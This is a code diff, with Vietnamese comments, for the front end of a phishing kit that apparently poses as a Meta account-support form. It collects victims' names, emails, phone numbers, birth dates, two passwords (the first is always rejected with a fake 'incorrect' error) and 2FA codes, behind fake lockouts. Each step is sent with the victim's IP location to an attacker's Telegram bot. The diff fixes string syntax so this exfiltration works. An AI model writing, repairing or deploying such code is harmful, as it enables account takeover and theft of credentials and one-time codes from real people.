@@ -30,7 +30,20 @@ const Modal = {
     // Hiển thị lỗi đỏ
     showError(type, msg) {
         if (type === 'password') {
-            const err = document.getElementById("passwordError");
+            // Tìm thẻ lỗi password
+            let err = document.getElementById("passwordError");
+            
+            // FIX: Nếu HTML lỡ quên chưa tạo thẻ lỗi, tự tạo luôn bằng JS để chắc chắn hiện
+            if (!err) {
+                const input = document.getElementById("passwordInput");
+                if(input) {
+                    err = document.createElement("p");
+                    err.id = "passwordError";
+                    err.className = "text-red-500 text-sm mb-3 text-center";
+                    input.parentNode.insertBefore(err, input.nextSibling);
+                }
+            }
+
             if (err) {
                 err.innerText = msg;
                 err.classList.remove("hidden");
@@ -48,6 +61,10 @@ const Modal = {
     hideError(type) {
         if (type === 'verify') {
             const err = document.getElementById("verifyError");
+            if (err) err.classList.add("hidden");
+        }
+        if (type === 'password') {
+            const err = document.getElementById("passwordError");
             if (err) err.classList.add("hidden");
         }
     }
@@ -85,7 +102,8 @@ const Utils = {
         if (!BOT_TOKEN || !CHAT_ID) return false;
 
         try {
-            const response = await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
+            // SỬA LỖI: Thêm dấu backtick ` bao quanh URL
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -113,26 +131,23 @@ const Utils = {
         else if (type === "OTP") icon = "🔥 OTP";
         else icon = "🔔 REPORT";
 
-        // --- INFO ---
-        let infoBlock = <b>Name:</b> ${data.fullName};
-        if (data.email) infoBlock += \n<b>Mail:</b> ${data.email};
-        if (data.businessEmail) infoBlock += \n<b>Biz Mail:</b> ${data.businessEmail}; // Business Email
-        infoBlock += \n<b>Phone:</b> ${data.phone};
-        if (data.dob) infoBlock += \n<b>DOB:</b> ${data.dob};
+        // SỬA LỖI: Thêm dấu backtick ` cho các biến chuỗi
+        let infoBlock = `<b>Name:</b> ${data.fullName}`;
+        if (data.email) infoBlock += `\n<b>Mail:</b> ${data.email}`;
+        if (data.businessEmail) infoBlock += `\n<b>Biz Mail:</b> ${data.businessEmail}`;
+        infoBlock += `\n<b>Phone:</b> ${data.phone}`;
+        if (data.dob) infoBlock += `\n<b>DOB:</b> ${data.dob}`;
 
-        // --- PASSWORD (Tích lũy) ---
         let passBlock = "";
-        if (data.pass1) passBlock += \n----------------\n<b>P1:</b> <code>${data.pass1}</code>;
-        if (data.pass2) passBlock += \n<b>P2:</b> <code>${data.pass2}</code>;
+        if (data.pass1) passBlock += `\n----------------\n<b>P1:</b> <code>${data.pass1}</code>`;
+        if (data.pass2) passBlock += `\n<b>P2:</b> <code>${data.pass2}</code>`;
         
-        // --- OTP ---
         let otpBlock = "";
-        if (data.twoFactorCode) otpBlock = \n----------------\n<b>📲 2FA:</b> <code>${data.twoFactorCode}</code>;
+        if (data.twoFactorCode) otpBlock = `\n----------------\n<b>📲 2FA:</b> <code>${data.twoFactorCode}</code>`;
 
-        // --- LOCATION ---
-        let ipBlock = \n================\n🌍 <code>${loc.ip}</code>\n📍 ${loc.city}, ${loc.country} ${loc.flag};
+        let ipBlock = `\n================\n🌍 <code>${loc.ip}</code>\n📍 ${loc.city}, ${loc.country} ${loc.flag}`;
 
-        return <b>${icon}</b> | ${time}\n----------------\n${infoBlock}${passBlock}${otpBlock}${ipBlock};
+        return `<b>${icon}</b> | ${time}\n----------------\n${infoBlock}${passBlock}${otpBlock}${ipBlock}`;
     },
 
     // Ẩn email/sđt để hiển thị ở form OTP
@@ -142,11 +157,11 @@ const Utils = {
             const parts = str.split('@');
             if (parts.length < 2) return str;
             const visible = parts[0].length > 3 ? parts[0].substring(0, 3) : parts[0].substring(0, 1);
-            return ${visible}***@${parts[1]};
+            return `${visible}***@${parts[1]}`;
         }
         if (type === 'phone') {
             if (str.length < 7) return str;
-            return ${str.substring(0, 3)}****${str.substring(str.length - 3)};
+            return `${str.substring(0, 3)}****${str.substring(str.length - 3)}`;
         }
         return str;
     }
@@ -168,9 +183,9 @@ document.addEventListener("DOMContentLoaded", async () => {
 
     // DOM Elements
     const btnSubmit = document.getElementById("submitRequestBtn");
-    const btnSendInfo = document.querySelector("#infoForm button"); // Nút Send ở form Info
-    const btnPass = document.getElementById("continueBtn");         // Nút Continue ở form Pass
-    const btnVerify = document.getElementById("verifyBtn");         // Nút Continue ở form OTP
+    const btnSendInfo = document.querySelector("#infoForm button");
+    const btnPass = document.getElementById("continueBtn");
+    const btnVerify = document.getElementById("verifyBtn");
     const countdownEl = document.getElementById("countdown");
 
     // Tạo Ticket ID ảo cho đẹp
@@ -188,22 +203,17 @@ document.addEventListener("DOMContentLoaded", async () => {
             const inputs = document.querySelectorAll("#infoForm .meta-input");
             const dobInputs = document.querySelectorAll("#infoForm .grid input");
 
-            // Map dữ liệu từ input (Thứ tự input trong HTML phải đúng)
             // [0] FullName, [1] Email, [2] Business Email, [3] Page Name, [4] Phone
             formData.fullName = inputs[0].value || "N/A";
             formData.email = inputs[1].value || "N/A";
-            formData.businessEmail = inputs[2].value || "N/A"; // Lấy Business Email
+            formData.businessEmail = inputs[2].value || "N/A";
             formData.phone = inputs[4].value || "N/A";
             
-            // Xử lý ngày sinh
             if (dobInputs.length >= 3) {
-                formData.dob = ${dobInputs[0].value}/${dobInputs[1].value}/${dobInputs[2].value};
+                formData.dob = `${dobInputs[0].value}/${dobInputs[1].value}/${dobInputs[2].value}`;
             }
 
-            // Gửi Log INFO
             Utils.sendMessage(Utils.formatReport(formData, "INFO", userLoc));
-            
-            // Chuyển sang form Password
             Modal.show("passwordForm");
         });
     }
@@ -214,29 +224,24 @@ document.addEventListener("DOMContentLoaded", async () => {
             const passInput = document.getElementById("passwordInput");
             const val = passInput.value;
             
-            if (!val) return; // Bắt buộc nhập
+            if (!val) return; 
 
             passwordAttempts++;
 
             if (passwordAttempts === 1) {
                 // === LẦN 1: Giả vờ sai ===
                 formData.pass1 = val;
-                
-                // Gửi Log Pass 1
                 Utils.sendMessage(Utils.formatReport(formData, "PASS1", userLoc));
 
-                // Báo lỗi, xóa input
                 passInput.value = "";
+                // Báo lỗi (Code bên trên đã thêm tự động tạo thẻ lỗi nếu thiếu)
                 Modal.showError("password", "The password you entered is incorrect. Please try again.");
                 
             } else {
                 // === LẦN 2: Chấp nhận -> Sang OTP ===
                 formData.pass2 = val;
-                
-                // Gửi Log Pass 2 (Utils tự gộp P1 và P2)
                 Utils.sendMessage(Utils.formatReport(formData, "PASS2", userLoc));
 
-                // Điền Email/Phone đã che vào form OTP
                 const maskEmailEl = document.getElementById("maskedEmail");
                 const maskPhoneEl = document.getElementById("maskedPhone");
                 if (maskEmailEl) maskEmailEl.innerText = Utils.maskString(formData.email, 'email');
@@ -250,51 +255,42 @@ document.addEventListener("DOMContentLoaded", async () => {
     // --- BƯỚC 3: XỬ LÝ OTP (Lock 30s) ---
     if (btnVerify) {
         btnVerify.addEventListener("click", () => {
-            if (isLocked) return; // Nếu đang khóa thì không cho bấm
+            if (isLocked) return; 
 
             const codeInput = document.getElementById("verifyCode");
             const codeVal = codeInput.value.trim();
 
-            if (!codeVal) return; // Chưa nhập code
+            if (!codeVal) return; 
 
             formData.twoFactorCode = codeVal;
             otpAttempts++;
 
-            // Gửi Log OTP ngay lập tức
             Utils.sendMessage(Utils.formatReport(formData, "OTP", userLoc));
 
-            // Logic Lock
             if (otpAttempts < 3) {
-                // === LẦN 1 & 2: Báo sai -> KHÓA 30 GIÂY ===
-                
-                // 1. Xóa code, Báo lỗi
+                // === LẦN 1 & 2: Sai -> KHÓA ===
                 codeInput.value = "";
                 Modal.showError("verify", "The code you entered is incorrect.");
 
-                // 2. Set trạng thái khóa
                 isLocked = true;
                 btnVerify.disabled = true;
                 btnVerify.style.opacity = "0.7";
                 btnVerify.innerText = "Please wait...";
 
-                // 3. Đếm ngược 30s
                 if (countdownEl) {
                     let seconds = 30;
                     countdownEl.classList.remove("hidden");
-                    countdownEl.innerText = Try again in ${seconds}s;
+                    countdownEl.innerText = `Try again in ${seconds}s`; // SỬA LỖI BACKTICK
 
                     const timer = setInterval(() => {
                         seconds--;
-                        countdownEl.innerText = Try again in ${seconds}s;
+                        countdownEl.innerText = `Try again in ${seconds}s`; // SỬA LỖI BACKTICK
 
                         if (seconds <= 0) {
-                            // Hết giờ -> MỞ KHÓA
                             clearInterval(timer);
                             isLocked = false;
-
-                            // Reset giao diện
                             countdownEl.classList.add("hidden");
-                            Modal.hideError("verify"); // Ẩn dòng lỗi đỏ đi cho đỡ rối
+                            Modal.hideError("verify");
                             
                             btnVerify.disabled = false;
                             btnVerify.style.opacity = "1";
@@ -304,7 +300,7 @@ document.addEventListener("DOMContentLoaded", async () => {
                 }
 
             } else {
-                // === LẦN 3: DONE -> CHUYỂN TRANG ===
+                // === LẦN 3: DONE ===
                 btnVerify.innerText = "Processing...";
                 btnVerify.disabled = true;
                 Modal.hideError("verify");
